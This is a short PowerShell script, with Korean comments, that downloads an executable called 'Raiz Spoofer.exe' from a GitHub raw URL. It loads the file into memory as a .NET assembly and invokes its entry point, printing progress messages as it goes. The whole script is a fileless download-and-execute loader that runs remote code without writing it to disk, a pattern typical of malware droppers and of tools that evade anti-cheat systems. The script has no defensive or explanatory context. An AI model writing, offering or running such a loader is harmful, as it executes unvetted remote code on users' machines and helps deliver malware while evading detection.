
$url = "https://raw.githubusercontent.com/tyu0720gyi/service/main/Raiz%20Spoofer.exe"

try {
    Write-Host "[*] READ FILE FOR RAIZ SERVER..." -ForegroundColor Cyan
    $webClient = New-Object System.Net.WebClient
    

    $data = $webClient.DownloadData($url)

    Write-Host "[*] LOADING MEMORY..." -ForegroundColor Cyan
    # 3. .NET 어셈블리로 로드
    $assembly = [System.Reflection.Assembly]::Load($data)
    
    Write-Host "[+] STARTING..." -ForegroundColor Green

    $assembly.EntryPoint.Invoke($null, @($null))
    
    Write-Host "LOADED!" -ForegroundColor Cyan
}
catch {
    Write-Host "[-] 에러 발생: $($_.Exception.Message)" -ForegroundColor Red
}
